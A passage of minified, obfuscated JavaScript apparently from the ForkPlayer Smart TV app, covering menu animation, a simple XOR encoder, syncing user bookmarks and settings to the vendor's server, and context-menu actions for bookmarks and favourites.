var titleRoll={stopAnim:!1,elAnim:null,timer:null,animate:function(scrollingWidth){var c=this;if(handler!="menu")return c.stop();var id=$($_('titleid'+getSelect()));if(!c.stopAnim&&id.length>0){c.elAnim=id;c.elAnim.animate({left:"-=30"},{duration:800,easing:'linear',complete:function(){var leftValue=parseInt(c.elAnim.css("left").replace("px",""));if(leftValue<-scrollingWidth){c.elAnim.css("left",0);setTimeout(function(){if(!c.stopAnim)c.animate(scrollingWidth)},1000)}else if(!c.stopAnim){c.animate(scrollingWidth)}}})}},stop:function(){if(this.elAnim){this.stopAnim=!0;this.elAnim.stop(!0,!0).css("left",0);this.elAnim=null}},start:function(w){var c=this;clearTimeout(c.timer);this.timer=setTimeout(function(){var id=$($_('titleid'+getSelect()));if(id.length>0){c.stop();var titleElem=$($_('title'+getSelect()));var scrollingWidth=id.width()-titleElem.width();if(id.css("position")=="relative"&&scrollingWidth>0){c.stopAnim=!1;c.animate(scrollingWidth+15)}}},1000)}};var progScroll=0;function scrollSite(){t_e();buff.cleartop();if(!progScroll&&gP())gP().renderChannels(null,"focused");else{}
progScroll=0}
function linkOver(s,el){maJor.hintremove();if(handler=='context'||handler=='vk'||handler=='move'||handler=='confirm'||handler=='group')return;if(gP())gP().aside_close();Il01QllQll().focused(s,el)}
RegExp.escape=function(text){return text.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&")};var selfbookm=!1;var mB64={b64_table:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-/=",keyCharAt:function(key,i){if(key.length)return key.charCodeAt(Math.floor(i%key.length));else return 0},ToNum:function(a){var c=this;var n=0,b=64;var mas=c.b64_table.slice(0,b);a=String(a);for(var i=0;i<a.length;i++){n=n+(mas.indexOf(a.substr(a.length-i-1,1))*Math.pow(b,i))}
return n},ToStr:function(a){var c=this;var s="",cc=64;var mas=c.b64_table.slice(0,cc);while(a>0){s=String(s)+mas[a%cc];a=Math.floor(a/cc)}
return s.split("").reverse().join("")},encrypt:function(text){var c=this;try{var key=gVs(maJor.mt.split("|")[0].split("="),1);text=_.map(text,function(co,i){var h1=co.charCodeAt(0)^c.keyCharAt(key,i);if(h1<64*64){var n1=Math.floor(h1/64);var n2=h1%64;var enc=c.b64_table.charAt(n1)+c.b64_table.charAt(n2)}else{enc="="+c.ToStr(h1)+"="}
return enc});text=text.join("");return text}catch(e){kjtYpr.popUp("Error join DATA! "+e.message,2000);return text}},decrypt:function(text,key){var c=this;key=String(key||gV(maJor.mt.split("|")[0].split("="),1));var i=0,res="",num=0;while(i<text.length){var h1=text.charAt(i++);var h2=text.charAt(i++);var e="";if(h1=="="){e+=h2;while(i<text.length&&text.charAt(++i)!="="){e+=text.charAt(i)}
i++}else e=h1+h2;e=c.ToNum(e);var code=c.keyCharAt(key,num)^e;res+=String.fromCharCode(code);num++}
return res}}
function autoexport(m){if(gV(m)=="user")var wuser=1;else wuser=0;if((!wuser&&maJor.wchanged)||(wuser&&maJor.user&&maJor.wuchanged)){var xhr=uHelper.create("directnoheader");xhr.parse=function(s){if(!s)maJor.statusbar("error sync data");else if(wuser){var data=lIlI1VBOOlI01QYpr(gV(s));if(data){maJor.statusbar("");maJor.wuchanged=0;allTimes=lIlI1VBOOlI01QYpr(data.times)}else maJor.statusbar("error sync user data")}else if(s.indexOf(".frk")>0){maJor.statusbar("");maJor.wchanged=0;if(m=="timer")return;else if(m=="store"){document.location="http://msx.benzac.de/?start=content:http://msx.appfxml.com/msx/content.json"}else setTimeout("closeapp();",1000)}else{maJor.statusbar("Ошибка сохранения данных на сервере! "+s)}}
var g="";if(wuser){var k=["glstart","bookmarks","history","zakladki.xml","zakladkiFilms.xml","zakladkiIPTV.xml","zakladkiSerials.xml","storage","times","settings","","","",""];for(var i=0;i<oInset.tabs.length;i++)k.push("url"+i);}else k=allfs;for(var i in k){if(k[i])var s=maJor.read(k[i]);else s="";if(k[i].indexOf("url")==0){var x=lIlI1VBOOlI01QYpr(s);if(x&&s)s=l1OOl0I0IASY10lQ10Ypr(x.slice(-5));else s=""}
g+=s+"[-..-]"}
xhr.getI("http://cloudflare.appfxml.com/browseraccount/?do=fexport&rev=4&"+(wuser?"v=user":"mode=auto")+"#POSTs="+mB64.encrypt(g))}}
var wlistRewrite=!1;var allfs=["glsearch","glstart","history","settings","epg_set","url0","url1","url2","url3","url4","url5","url6","url7","urlInset","searches","enteres","zakladki.xml","zakladkiSerials.xml","zakladkiFilms.xml","zakladkiIPTV.xml","times","vk_audio_pl","vk_audio_sel","vk_pl_url","bookmarks","lic","mlang","ordered","xr","url8","url9","storage","lastdata","datas","mf","url10","url11"];function shint(s,s2){if(s2!=null){if(s2=="p"){if(s=="")return"_FPOtkl._";else return s.replace(/./g,"*")}
if(s2=="a"){if(s==0)return"_FPOtkl._";if(s==1)return"_FPVkl._ (auto)";if(s==2)return"_FPVkl._ (Audio _FPpleer_)";if(s==3)return"_FPVkl._ (Html5 _FPpleer_)";if(s==4)return"_FPVkl._ (Media _FPpleer_)"}
if(s2==7){if(s==0)return"_FPOtkl._";else if(s==2)return"#Кадры из фильмов";else if(s==1)return"#Рекомендации фильмов"}}
if(s==12)return"_FPVkl._ (Rus - Eng)";else if(s==11)return"_FPVkl._ (Eng - Rus)";else if(s==13)return"_FPVkl._ (_FPManually_)";else if(s==3){if(maJor.params.get("remoteip")=="")var ds="_FPEnter_ IP:PORT";else ds=maJor.params.get("remoteip");return"_FPManually_ "+ds}else if(s==2)return"_FPAuto_";else if(s==1||s===!0)return"_FPVkl._";else if(s==0||s==10||s==20||s==40||s==""||s===!1)return"_FPOtkl._";else if(s==21)return"_FPTolko_ IPTV";else if(s==22)return"_FPDlyaVsV_";else if(s==29)return"_FPOnly local_";else if(s==30)return"_FPLocal_";else if(s==31)return"_FPOn Server_";else if(s==32)return"_FPOtkl_";else if(s==41)return"_FPPercent_";else if(s==50)return"_FPAuto_";else if(s>50&&s<70)return"_FPServer_ "+(s-50);else if(s==70)return"_FPpoumolch_";else if(s==71)return"V"+"K_RED";else if(s==72)return"V"+"K_GREEN";else if(s==73)return"V"+"K_YELLOW";else if(s==74)return"V"+"K_BLUE";else if(s==75)return"V"+"K_LEFT (только в списках)";else return s}
kjtYpr.Edit=function(n,cmd){var curPage=gP();var select=getSelect();if(l0OII100kdNdQl01lYpr(n)){var oldselect=getSelect();if(cmd=="up")Il01QllQll().posStart(0,-1);else if(cmd=="down")Il01QllQll().posStart(0,1);else if(cmd=="left")Il01QllQll().posStart(-1,0);else if(cmd=="right")Il01QllQll().posStart(1,0);if(curPage.channels[oldselect].source!="fav"||curCh()["source"]!="fav"){Il01QllQll().focused(oldselect);kjtYpr.popUp("_FPMove only Favorites_!",1000);return}
if(getSelect()<0)setSelect(0);if(oldselect!=getSelect()){var t=getVars("start");var tmp=t.fav[curPage.channels[oldselect].id];t.fav[curPage.channels[oldselect].id]=t.fav[curCh()["id"]];t.fav[curCh()["id"]]=tmp;setVars("start",t);maJor.setHandler("menu");curPage.channels=getVars("start").channels;Il01QllQll().replace(curPage.channels);handler="move";return}}
var data=xhr_bookmark(n);if(cmd=="up")var selnew=select-1;else if(cmd=="down")selnew=select+1;else if(cmd=="left")selnew=select-10;else if(cmd=="right")selnew=select+10;else selnew=null;if(selnew!=null){if(selnew<0)selnew=data.channels.length-1;else if(selnew>data.channels.length-1)selnew=0;if(selnew!=select){var x=data.channels[select];data.channels[select]=data.channels[selnew];data.channels[selnew]=x;xhr_bookmark(n,"update",data);setSelect(selnew);Il01QllQll().replace(data.channels)}}};function lIlI11I1I_q0000I1Ypr(n,y){var res=0;if(String(maJor.params.get("fs")).substr(12,1)=="1"){if(n!=12&&n!=6)res=1}
if(y==null)return res;else if(y===1)return["Да","Нет"][res];else if(y===0)return["Нет","Да"][res];else return y[res]}
var ContextMenu={lIl00l0QcIl01IIYpr:0,Menu:[],sublIl00l0QcIl01IIYpr:0,subMenu:[],submenuParent:null,lastBookm:{"url":""},submenuSelIcon:{},closeMenu:function(){this.Menu=[];$_("MenuCh","");$_("MenuCh").style.display="none"},closeSubMenu:function(){var obj=$_("submenu");if(obj&&obj.parentNode)obj.parentNode.removeChild(obj);this.subMenu=[];this.pos(this.lIl00l0QcIl01IIYpr)},close:function(){this.closeSubMenu();this.closeMenu()},play:function(cmd,opt){if(cmd=="selfbookmark"){if($_("selfbookmarkimg").src==_img("_ST_select_all.png")){selfbookm=!1;$_("selfbookmarkimg").src=""+_img("_ST_1px.png")+""}else{selfbookm=!0;$_("selfbookmarkimg").src=_img("_ST_select_all.png");kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> Может увеличиться время запуска закладки! Адрес закладки будет всегда самообновляться с этого плейлиста! ",3500)}
return}
if($_("vk").style.display!="none"){$_("vk").style.display="none";kjtYpr.inputId="";$_("main").style.display="block";maJor.setHandler("menu")}
this.closeSubMenu();$_("MenuCh").style.display="none";if(typeof cmd=="function"){if(!cmd(opt)){$_("MenuCh","");maJor.setHandler("menu")}
return}
var curPage=gP();var ch=curCh();wlistRewrite=!1;switch(cmd){case "cmdGoURL":maJor.setHandler("menu");Il01QllQll().navigate(opt);break;case "cmdMail":maJor.setHandler("menu");setSelect(0);ol0I1OIuIyUII0lYpr("cmdmail");break;case "cmdOpenStart":maJor.setHandler("menu");setSelect(0);gotoStart();break;case "cmdRewrite":wlistRewrite=!0;kjtYpr.lIlQ0l1oOmOlOQYpr();break;case "cmdOpenInsetClose":insetSelect=oInset.tabs.length-1;oInset.tabs[insetSelect]=oldinset;oInset.playInset();maJor.setHandler("menu");break;case "cmdSetIcon":if(this.submenuSelIcon.playlist_url.indexOf("bookmarks/")==0&&!this.selIconstart){xhr_bookmark(this.submenuSelIcon.playlist_url,cmd,opt)}else if(this.submenuSelIcon.id){var t=getVars("start");t.fav[this.submenuSelIcon.id].logo_30x30=opt;setVars("start",t);$_("vk").style.display="none";kjtYpr.inputId="";maJor.setHandler("menu");if(l0OII100kdNdQl01lYpr())Il01QllQll().reload()}
this.submenuSelIcon={};maJor.setHandler("menu");break;case "cmdSelIcon":this.selIconstart=l0OII100kdNdQl01lYpr();this.submenuSelIcon=ch;this.submenuSelIcon.selicon=!0;maJor.setHandler("menu");this.subMenu=[];break;case "cmdUrlIcon":VK.open({title:"_FPEnterURLicon_",value:curCh("logo_30x30"),oncomplete:function(c){if(l0OII100kdNdQl01lYpr()){var t=getVars("start");t.fav[c.pq.el.id].logo_30x30=c.str;setVars("start",t);c.close();setTimeout("Il01QllQll().reload();",15)}else if(c.pq.el.playlist_url.indexOf("bookmarks/")==0){xhr_bookmark(c.pq.el.playlist_url,cmd,c.str)}
return 1}});break;case "cmdDelAbout":if(l0OII100kdNdQl01lYpr()){var t=getVars("start");if(curCh("source")=="fav"){var el=t.fav[curCh("id")];if(el&&el.description){maJor.inf("delete description");delete el.description}
kjtYpr.inf("Удалено описание ("+ch.title+")",1500);setVars("start",t);maJor.setHandler("menu");setTimeout("Il01QllQll().reload();",15)}}else return 1;break;case "cmdEditUrl":VK.open({title:"_FPEnter URL_",value:(curCh("playlist_url")||curCh("stream_url")),oncomplete:function(c){if(l0OII100kdNdQl01lYpr()){var t=getVars("start");var el=t.fav[c.pq.el.id];if(el.stream_url)el.stream_url=c.str;else el.playlist_url=c.str;setVars("start",t);c.close();setTimeout("Il01QllQll().reload();",15)}else return 1}});break;case "cmdSetTV":if(String(curCh("playlist_url")).match(/^(bookmarks|zakladki)/)){xhr_bookmark(curCh("playlist_url"),cmd)}
return 1;break;case "cmdRename":this.selIconstart=l0OII100kdNdQl01lYpr();VK.open({title:"_FPEnterTitle_",value:curCh("title").replace(/<.*?>/g,""),oncomplete:function(c){if(c.str=='')return;if(l0OII100kdNdQl01lYpr()){var t=getVars("start");t.fav[c.pq.el.id].title=c.str;setVars("start",t)}else if(gV(c.pq.el,"playlist_url").indexOf("bookmarks/")==0){xhr_bookmark(c.pq.el.playlist_url,cmd,c.str)}else if(gP("lO10111O0001lOl00Ypr").indexOf("bookmarks/")==0){xhr_bookmark(gP("lO10111O0001lOl00Ypr"),"bookmarkRename",c.str)}else if(gP("lO10111O0001lOl00Ypr").indexOf("zakladki")==0){var data=lIlI1VBOOlI01QYpr(maJor.read(gP("lO10111O0001lOl00Ypr")));if(data==null){data={};data["cha"+"nnels"]=[]}else data["cha"+"nnels"][c.select].title=c.str;maJor.write(gP("lO10111O0001lOl00Ypr"),l1OOl0I0IASY10lQ10Ypr(data))}
c.close();setTimeout("Il01QllQll().reload();",15);return 1}});break;case "cmdAudioV":vPlayer.audio.visual(opt);maJor.setHandler("menu");break;case "cmdAudioRepeat":vPlayer.audio.repeat(1);maJor.setHandler("menu");break;case "cmdAudioShuffle":vPlayer.audio.shuffle();maJor.setHandler("menu");break;case "cmdAudioClose":vPlayer.audio.closeAndDelete();maJor.setHandler("menu");break;case "Bookmarks":case "cmdAudio":case "cmdSorting":case "cmdMoveBookmarks":case "cmdEdit":ContextMenu.showSubMenu(cmd);break;case "cmdRemoteUpdate":maJor.setHandler("menu");maJor.Remote.init();break;case "cmdTranslate":maJor.setHandler("menu");maJor.params.get("lang");var k=insetIn(-1,"get","title")+"[-|-]";for(var i=0;i<curPage.channels.length;i++){k+=curPage.channels[i].title+"[-|-]";k+=curPage.channels[i].description+"[-|-]"}
maJor.statusbar("translate page to "+maJor.params.get("lang")+"      ","translate");llO0O0lhrlO01O1O1YprPost("http://exec.remotecurl.appfxml.com/smarttv/api.php?do=translatepage&format=html&lang="+maJor.params.get("lang"),"k="+encodeURIComponent(k),"translatepage");break;case "cmdInsetBlock":Il01QllQll().put("b",!Il01QllQll().get("b"));maJor.setHandler("menu");break;case "cmdInsetStart":if(insetIn(-1,"get","a")==""){for(var i=0;i<oInset.tabs.length;i++){if(insetIn(-1,"get","a",null,i)=="1")insetIn(-1,"put","a","",i)}
insetIn(-1,"put","a","1");insetIn(-1,"put","b","1");if(!maJor.params.get('recovery')){kjtYpr.popUp("_FPUdalenaGrupa_: _FPStartovoeMenu_");maJor.params.set('recovery',1)}}else insetIn(-1,"put","a","");maJor.setHandler("menu");break;case "cmdCancel":this.submenuSelIcon={};maJor.setHandler("menu");break;case "cmdReset":ol0I1OIuIyUII0lYpr("cmdreset");break;case "cmdGroup":maJor.setHandler("menu");OpenUrl({"title":"_FPCategorys_","playlist_url":gP("lO10111O0001lOl00Ypr").split("#CAT=")[0]+"#CAT=LISTCATS"});break;case "cmdSetSorting":var nm=gP().ord_id();if(!maJor.ordered){confirmed.create("Очистить сортировку можно будет в настройках<br>_FPEnabling can slow opening iptv lists_","_FPTurn on_?").fun=[function(){maJor.ordered={};for(var index=0;index<gP().channels.length;index++){if(typeof gP().channels[index]==="object"){gP().channels[index].origsel=index}}
gP().ordchannels=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(gP().channels));gP().channels=gP().ordchannels;ContextMenu.play(cmd,opt)}];return}
if(typeof ch.origsel!=="undefined"&&ch.origsel!=="undefined")var origsel=ch.origsel;else origsel=getSelect();if(!maJor.ordered[nm])maJor.ordered[nm]={};if(!maJor.ordered[nm][origsel])maJor.ordered[nm][origsel]=0;opt=parseInt(opt);if(opt==0)maJor.ordered[nm][origsel]=0;else maJor.ordered[nm][origsel]+=opt;if(maJor.ordered[nm][origsel]==0)delete maJor.ordered[nm][origsel];maJor.write("ordered",l1OOl0I0IASY10lQ10Ypr(maJor.ordered));maJor.setHandler("menu");gP().channels=gP().reordered(lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(gP().ordchannels)));var old_s=getSelect();gP().renderChannels(old_s,"update");break;case "cmdToStart":function caddtostart(m){var ch=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(m));if((gV(ch,"playlist_url").indexOf("no_save")>0||gV(ch,"stream_url").indexOf("no_save")>0)&&gP("lO10111O0001lOl00Ypr").indexOf("http")==0){kjtYpr.inf("_FPCopied denied by author playlist_! "+ch.title,2500);maJor.setHandler("menu")}else{var obj=cleanCh(ch);var t=getVars("start");t.fav.push(obj)
setVars("start",t);kjtYpr.inf("_FPDobavlenoV_ _FPStartovoeMenu_ "+obj.title,1200)}}
var s=maJor.read("glstart");if(s.indexOf("{")!==0){var favlist=[];var fch=readSt();for(var i in fch){if(gV(fch[i],"source")=="fav")favlist.push(gV(fch[i]))}}
if(favarray!=null)caddtostart(favarray);else if(getSelect()<0){ch={};ch.playlist_url=Il01QllQll().get("url");ch.title=Il01QllQll().get("title");ch.logo_30x30=Il01QllQll().get("img");ch.parser=Il01QllQll().get("p");caddtostart(ch)}else{markedObj.entries(function(m,n){caddtostart(m)});markedObj.cancel()}
maJor.setHandler("menu");if(l0OII100kdNdQl01lYpr())Il01QllQll().reload();else Il01QllQll().focused();favarray=null;break;case "cmdDelFromStart":t=getVars("start");markedObj.entries(function(ch,n){if(ch.playlist_url=="searchEngines"){kjtYpr.inf("Этот пункт нельзя удалить!",1200)}else if(gV(ch,"source")=="fav"){t.fav.splice(ch.id,1);setVars("start",t);kjtYpr.inf("Удалено из Избранное ("+ch.title+")",1500)}else if(String(gV(ch,"source")).match(/(usertop)/)){delete maJor.userTop[ch.playlist_url];kjtYpr.inf("Удалено из истории адрес сайта ("+ch.title+")",1500)}else if(String(gV(ch,"source")).match(/(grid|top|third|service)/)){if(typeof t.hidetop=="undefined")t.hidetop={};t.hidetop[ch.playlist_url+ch.stream_url]=1;setVars("start",t);kjtYpr.inf("Скрыт элемент ("+(ch.title||ch.display_title||ch.playlist_url)+")",1500)}});markedObj.cancel();maJor.setHandler("menu");if(l0OII100kdNdQl01lYpr())Il01QllQll().replace(getVars("about:blank").channels);else Il01QllQll().reload();break;case "cmdNewInset":setSelect(0);oInset.newInset(0);maJor.setHandler("menu");break;case "cmdNewInsetPriv":setSelect(0);oInset.newInset(1);kjtYpr.popUp("Ваши действия в режиме инкогнито будут недоступны другим пользователям этого устройства. Однако закладки сохранятся.<br>В ForkPlayer не будет сохраняться следующая информация:<br>история просмотров; файлы cookie и данные сайтов;сведения, которые вы указываете в формах.",2500);maJor.setHandler("menu");break;case "cmdSetWeather":gP().lO10111O0001lOl00Ypr=cmd;var data={"playlist_name":""};data["chan"+"nels"]=[];for(var i=0;i<gs.count;i++){if(gs.url[i].title==""){var ttl=gs.url[i].url.split("/");gs.url[i].title=ttl[ttl.length-1].split(".")[0]}
var x=(gs.url[i].show=="1")?"<font color=green>_FPVkl_</font>":"<font color=red>_FPOtkl_</font>";data["chan"+"nels"].push({"logo_30x30":gs.url[i].logo,"title":gs.url[i].title+" "+x,"playlist_url":"setGlSearch"})}
maJor.setHandler("menu");kjtYpr.llI1lOll11oDMl00IOYpr(data);break;case "cmdSearch":maJor.setHandler("menu");Il01QllQll().navigate("about:yoursearchEngines|"+ch.title);return;break;case "cmdUp":handler="move";return;break;case "":curPage=gP();if(getSelect()==-1){if(insetIn(-1,"get","url").indexOf("no_save")>0){kjtYpr.inf("_FPCopied denied by author playlist_!",2500);maJor.setHandler("menu");return}}
if(gP("lO10111O0001lOl00Ypr").indexOf("no_save")>0){kjtYpr.inf("_FPCopied denied by author playlist_!",2500);maJor.setHandler("menu");return}
try{var n=opt||opt;if(n!="bookmarks/toolbar"){this.lastBookm.url=n;this.lastBookm.title=maJor.params.get(n);this.lastBookm.logo_30x30=""}
var pl_title=maJor.params.get(n);pl_title=maJor.params.get(n);if(n.indexOf("bookmarks/")==0){var s=""}else{s=maJor.read(n)}
var data=lIlI1VBOOlI01QYpr(s);if(data==null){data={};data["cha"+"nnels"]=[]}
if(!curPage.is_mark){curPage.is_mark_array={};curPage.is_mark_array[getSelect()]="1"}
var count=0;for(var i=curPage.channels.length-1;i>=0;i--){if(curPage.is_mark_array[i]=="1"||getSelect()<0){if(favarray!=null)var ch=favarray;else if(getSelect()<0){ch={};ch.stream_url="";ch.playlist_url=Il01QllQll().get("url");ch.title=Il01QllQll().get("title");ch.logo_30x30=Il01QllQll().get("img");ch.parser=ch.parser_orig=Il01QllQll().get("p")}else ch=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(curPage.channels[i]));if(selfbookm){ch.stream_url="md5hash";var title=ch.title;if(title.indexOf("<div")==0){title=title.match(/.*nowrap;'>(.*?)</)[1]}
ch.parser=gP("lO10111O0001lOl00Ypr")+"|selfReNewBookmark|"+title}
if((ch.playlist_url+ch.stream_url).indexOf("no_save")>=0)kjtYpr.inf("_FPCopied denied by author playlist_!",2500);else if(s.indexOf(ch.playlist_url+ch.stream_url)!=-1&&ch.parser==""){kjtYpr.inf(ch.title.substr(0,15)+" - _FPZaklUzheEst_ "+pl_title,1000)}else{var obj=cleanCh(ch);if(n.indexOf("bookmarks/")==0){xhr_bookmark(n,"add",obj,count++);if(n=="bookmarks/addnew")break}else{data["cha"+"nnels"].unshift(obj);maJor.write(n,l1OOl0I0IASY10lQ10Ypr(data));l0OI1uul1IllYpr();kjtYpr.inf("_FPDobavlenoV_ "+pl_title,1000)}}
if(getSelect()<0)break}}}catch(e){}
favarray=null;curPage.is_mark=!1;Il01QllQll().focused();selfbookm=!1;maJor.setHandler("menu");break;case "cmdMove":try{var n=opt;var pl_title=maJor.params.get(n);var s=maJor.read(n);if(!curPage.is_mark){curPage.is_mark=!0;curPage.is_mark_array={};curPage.is_mark_array[getSelect()]="1"}
if(n.indexOf("bookmarks/")!=0){var dataTo=lIlI1VBOOlI01QYpr(s);if(dataTo==null)dataTo={"channels":[]}}
if(gP("lO10111O0001lOl00Ypr").indexOf("bookmarks/")!=0)var data=lIlI1VBOOlI01QYpr(maJor.read(gP("lO10111O0001lOl00Ypr")));for(var i=0;i<curPage.channels.length;i++){if(curPage.is_mark_array[i]=="1"){if(n.indexOf("bookmarks/")==0){xhr_bookmark(n,"add",curPage.channels[i])}else dataTo["cha"+"nnels"].unshift(curPage.channels[i])}}
var k=0;var ln=curPage.channels.length;for(var i=0;i<ln;i++){if(curPage.is_mark_array[i]=="1"){if(gP("lO10111O0001lOl00Ypr").indexOf("bookmarks/")==0){xhr_bookmark(gP("lO10111O0001lOl00Ypr"),"cmdDel",(i-k))}else data["chan"+"nels"].splice(i-k,1);k++}}
if(n.indexOf("bookmarks/")!=0)maJor.write(n,l1OOl0I0IASY10lQ10Ypr(dataTo));if(gP("lO10111O0001lOl00Ypr").indexOf("bookmarks/")!=0)maJor.write(gP("lO10111O0001lOl00Ypr"),l1OOl0I0IASY10lQ10Ypr(data));if(n.indexOf("bookmarks/")!=0)kjtYpr.inf("_FPPeremV_ "+pl_title,1000);curPage.is_mark=!1}catch(e){}
maJor.setHandler("menu");Il01QllQll().reload();break;case "cmdDel":var n=gP("lO10111O0001lOl00Ypr");if(getSelect()==-2)n="bookmarks/toolbar";var data=lIlI1VBOOlI01QYpr(maJor.read(n));if(curPage.is_mark){var k=0;var ln=curPage.channels.length;var count=0;for(var i=0;i<ln;i++){if(curPage.is_mark_array[i]=="1"){if(gP("lO10111O0001lOl00Ypr").indexOf("bookmarks/")==0){if(n=="bookmarks/extbookm"){setTimeout('xhr_bookmark("bookmarks/extbookm","cmdDel",'+i+');',++count*100)}else xhr_bookmark(n,"cmdDel",i-k,count++)}else data["chan"+"nels"].splice(i-k,1);k++}}
curPage.is_mark=!1}else{if(n.indexOf("bookmarks/")==0){xhr_bookmark(n,cmd,getSelect())}else data["chan"+"nels"].splice(getSelect(),1)}
maJor.setHandler("menu");if(n.indexOf("bookmarks/")==0){Il01QllQll().replace(data["chan"+"nels"])}else{maJor.write(n,l1OOl0I0IASY10lQ10Ypr(data));Il01QllQll().replace(xhr_bookmark(n).channels);kjtYpr.inf("Удалено!",1000)}
break;case "cmdClear":var n=opt;if(n=="history"){maJor.write("history","");lO01II111Irn0OI1IlYpr=[]}else{for(var i=maJor.enteresObj.length-1;i>=0;i--){var el=maJor.enteresObj[i];var res=el.n.match(rUrl);if((!res&&n==="histsearch")||(res&&n==="histurl")){maJor.enteresObj.splice(i,1)}}
maJor.write("enteres",l1OOl0I0IASY10lQ10Ypr(maJor.enteresObj))}
kjtYpr.inf("_FPIstOchishena_: "+n,1000);maJor.setHandler("menu");Il01QllQll().reload();break;case "cmdForkStore":if(maJor.user){autoexport("user")}
if(maJor.params.get('ts')>0)autoexport("store");else{document.location="http://msx.benzac.de/?start=content:http://msx.appfxml.com/msx/content.json"}
break;case "cmdExit":maJor.setHandler("menu");if(maJor.params.get('ts')>0){autoexport("user");autoexport();setTimeout("closeapp();",2000)}else if(maJor.user){autoexport("user");setTimeout("closeapp();",2000)}else closeapp();break;default:maJor.setHandler("menu");break}},showSubMenu:function(m,sub){this.closeSubMenu();$_("MenuCh").style.display="block";$_("l01Il0Ilu0D101OIYpr"+this.lIl00l0QcIl01IIYpr).style.backgroundColor="#464d5a";maJor.setHandler("context");var div=document.createElement('div');div.id="submenu";div.style.color="#EEEEEE";div.style.overflow="visible";div.style.textAlign="left";div.style.width="auto";div.style.padding="5px";div.style.maxWidth="390px";div.style.borderRadius="5px";div.style.fontSize="23px";div.style.backgroundColor="#323c42";div.style.position="absolute";this.sublIl00l0QcIl01IIYpr=0;this.submenuParent=this.lIl00l0QcIl01IIYpr;if(sub)this.subMenu=sub;else if(m){if(m=="cmdSorting"){this.subMenu.push({title:"_FPTop_ (+1 prority)",cmd:"cmdSetSorting",args:"1"});this.subMenu.push({title:"_FPpoumolch_ (delete prority)",cmd:"cmdSetSorting",args:"0"});this.subMenu.push({title:"_FPBottom_ (-1 prority)",cmd:"cmdSetSorting",args:"-1"})}else if(m=="cmdAudio"){this.subMenu.push({"title":"Повтор","cmd":"cmdAudioRepeat"});this.subMenu.push({"title":"Перемешать","cmd":"cmdAudioShuffle"});this.subMenu.push({"title":"Визуализация 1 ","cmd":"cmdAudioV","args":"3"});this.subMenu.push({"title":"Закрыть аудиоплеер","cmd":"cmdAudioClose"})}else if(m=="Bookmarks"||m=="cmdMoveBookmarks"){if(m=="Bookmarks"){var s1="_FPDobavitV_";var s2=""}else{s1="_FPPeremV_";s2="cmdMove"}
if(gP("is_iptv")>2&&getSelect()>=0&&curCh("stream_url")&&!curCh("parser")){this.subMenu.push({"title":"Самообновляемая закладка",icon:_img("_ST_1px.png"),"cmd":"selfbookmark"})}
if(maJor.read("zakladki.xml"))this.subMenu.push({"title":s1+" _FPzakladki_ / _FPRaznoe_","cmd":s2,"args":"zakladki.xml"});if(maJor.read("zakladkiSerials.xml"))this.subMenu.push({"title":s1+" _FPzakladki_ / _FPSeriali_","cmd":s2,"args":"zakladkiSerials.xml"});if(maJor.read("zakladkiFilms.xml"))this.subMenu.push({"title":s1+" _FPzakladki_ / _FPFilmi_","cmd":s2,"args":"zakladkiFilms.xml"});if(maJor.read("zakladkiIPTV.xml"))this.subMenu.push({"title":s1+" _FPzakladki_ / IPTV","cmd":s2,"args":"zakladkiIPTV.xml"});var dopch=lIlI1VBOOlI01QYpr(maJor.read("bookmarks"))||[];for(var i=0;i<dopch.length;i++){if(dopch[i].playlist_url!="bookmarks/toolbar")
this.subMenu.push({"title":s1+" "+dopch[i].title,icon:dopch[i].logo_30x30,"cmd":s2,"args":dopch[i].playlist_url})}
this.subMenu.push({"title":s1+" Новую папку","cmd":s2,"args":"bookmarks/addnew","icon":"_ST_plus.png"});this.subMenu.push({"title":s1+" _FPBookmark toolbar_","cmd":s2,"args":"bookmarks/toolbar"});this.subMenu.push({"title":s1+" _FPVneshnie_ _FPzakladki_","cmd":s2,"args":"bookmarks/addext","icon":"_ST_b_c.png"});this.subMenu.push({"title":s1+" _FPVneshnie_ _FPzakladki_ 2","cmd":s2,"args":"bookmarks/addext2","icon":"_ST_b_c.png"});this.subMenu.push({"title":s1+" _FPVneshnie_ _FPzakladki_ 3","cmd":s2,"args":"bookmarks/addext3","icon":"_ST_b_c.png"})}else if(m=="cmdEdit"){this.subMenu.push({title:"_FPRename_",cmd:"cmdRename"});if(gP("lO10111O0001lOl00Ypr").indexOf("bookmarks/")!=0&&gP("lO10111O0001lOl00Ypr").indexOf("zakladki")!=0){this.subMenu.push({title:"_FPChangeURLicon_",cmd:"cmdUrlIcon"});this.subMenu.push({title:"_FPSelectIcon_",cmd:"cmdSelIcon"});this.subMenu.push({title:"_FPEdit URL_",cmd:"cmdEditUrl"});if(curCh("description"))this.subMenu.push({title:"Удалить описание",cmd:"cmdDelAbout"});if(curCh("type")=="tv"||curCh("type")=="dir"){this.subMenu.push({title:"_FPЭто плейлист ТВ_",cmd:"cmdSetTV",icon:(curCh("type")=="tv"?_img("_ST_select_all.png"):"_ST_1px.png")})}}}}
var html="";for(var i=0;i<this.subMenu.length;i++){if(this.subMenu[i].overline)html+="<div style='height:1px;margin:2px 0px 0px 0px;border-top:1px solid gray;'>&nbsp;</div>";if(this.subMenu[i].icon){var m_img=String(this.subMenu[i].icon);if(m_img.indexOf("/")==0)m_img="http://browser.appfxml.com/img"+m_img;m_img="<img src='"+_img(m_img)+"' "+(this.subMenu[i].cmd=="selfbookmark"?"id='selfbookmarkimg'":"")+" />"}else m_img="";if(this.subMenu[i].before)html+=this.subMenu[i].before;html+="<div"+lIlI11I1I_q0000I1Ypr(1,[" onmousemove=\"ContextMenu.pos("+i+", true);\" onclick=\"ContextMenu.enter();\"",""])+" id='subl01Il0Ilu0D101OIYpr"+i+"' class='menucontext'><div class='menuicon'>"+m_img+"</div>"+this.subMenu[i].title+"</div>";if(this.subMenu[i].after)html+=this.subMenu[i].after}
